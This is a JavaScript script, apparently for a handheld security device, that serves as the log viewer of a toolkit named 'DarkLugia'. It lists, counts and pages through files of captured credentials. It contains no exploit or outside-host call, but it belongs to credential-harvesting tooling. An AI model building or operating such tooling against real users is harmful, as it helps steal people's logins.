// Logs Viewer - Display Captured Credentials
// Linux-compatible version with error handling

try {
    // Initialize paths using current directory
    const base_path = "./DarkLugia";
    const logs_path = base_path + "/logs";
    
    // Ensure logs directory exists
    system.create_directory(logs_path);
    
    // Display header
    display.clear();
    display.set_color(0, 255, 0); // Green text
    display.print("=== DARKLUGIA LOGS VIEWER ===");
    display.set_color(255, 255, 255); // White text
    display.print("");
    
    // Get list of all log files
    var log_files = storage.list_files(logs_path);
    
    if(!log_files || log_files.length === 0) {
        display.print("No logs found in:");
        display.print(logs_path);
        display.print("");
        display.print("Check back after capturing credentials.");
        return;
    }
    
    display.print("Found " + log_files.length + " log files:");
    display.print("");
    
    // Display each log file with line count
    var total_entries = 0;
    for(var i = 0; i < log_files.length; i++) {
        var file_name = log_files[i];
        var file_path = logs_path + "/" + file_name;
        
        try {
            // Read file content
            var content = storage.read(file_path);
            var lines = content.split("\n").filter(function(line) { 
                return line.trim().length > 0; 
            });
            var entry_count = lines.length;
            total_entries += entry_count;
            
            // Display file info
            display.set_color(100, 200, 255); // Cyan
            display.print("[" + i + "] " + file_name);
            display.set_color(255, 255, 255); // White
            display.print("    Entries: " + entry_count);
            
        } catch (e) {
            display.set_color(255, 0, 0); // Red
            display.print("[ERR] Failed to read: " + file_name);
            display.set_color(255, 255, 255); // White
            console.error("Error reading " + file_path + ": " + e);
        }
    }
    
    display.print("");
    display.set_color(0, 255, 0); // Green
    display.print("TOTAL ENTRIES: " + total_entries);
    display.set_color(255, 255, 255); // White
    display.print("");
    
    // Allow user to select a file to view
    display.print("Select file (0-" + (log_files.length - 1) + ")");
    display.print("Press [0-9] to view contents");
    display.print("Or press [ESC] to exit");
    
    // Wait for user input
    var selected = input.get_key();
    var file_index = parseInt(selected);
    
    if(isNaN(file_index) || file_index < 0 || file_index >= log_files.length) {
        display.print("Invalid selection. Exiting.");
        return;
    }
    
    // Display selected file contents
    var selected_file = log_files[file_index];
    var selected_path = logs_path + "/" + selected_file;
    
    display.clear();
    display.set_color(0, 255, 0);
    display.print("=== " + selected_file + " ===");
    display.set_color(255, 255, 255);
    display.print("");
    
    try {
        var file_content = storage.read(selected_path);
        var entries = file_content.split("\n").filter(function(line) { 
            return line.trim().length > 0; 
        });
        
        // Display entries with pagination
        var page_size = 10;
        var current_page = 0;
        var total_pages = Math.ceil(entries.length / page_size);
        
        while(true) {
            display.clear();
            display.set_color(0, 255, 0);
            display.print("=== " + selected_file + " ===");
            display.set_color(255, 255, 0); // Yellow
            display.print("Page " + (current_page + 1) + "/" + total_pages);
            display.set_color(255, 255, 255); // White
            display.print("");
            
            // Display page entries
            var start = current_page * page_size;
            var end = Math.min(start + page_size, entries.length);
            
            for(var j = start; j < end; j++) {
                // Truncate long entries
                var entry = entries[j];
                if(entry.length > 50) {
                    entry = entry.substring(0, 47) + "...";
                }
                display.print(entry);
            }
            
            display.print("");
            display.print("[UP] Prev  [DOWN] Next  [ESC] Exit");
            
            var key = input.get_key();
            
            if(key === "UP" && current_page > 0) {
                current_page--;
            } else if(key === "DOWN" && current_page < total_pages - 1) {
                current_page++;
            } else if(key === "ESC") {
                break;
            }
        }
        
    } catch (e) {
        display.clear();
        display.set_color(255, 0, 0);
        display.print("ERROR reading file:");
        display.print(e.toString());
        console.error("Error: " + e);
    }
    
    display.clear();
    display.print("Logs viewer closed.");
    
} catch (error) {
    display.clear();
    display.set_color(255, 0, 0);
    display.print("LOGS VIEWER ERROR");
    display.print(error.toString());
    console.error("Logs viewer error: " + error);
}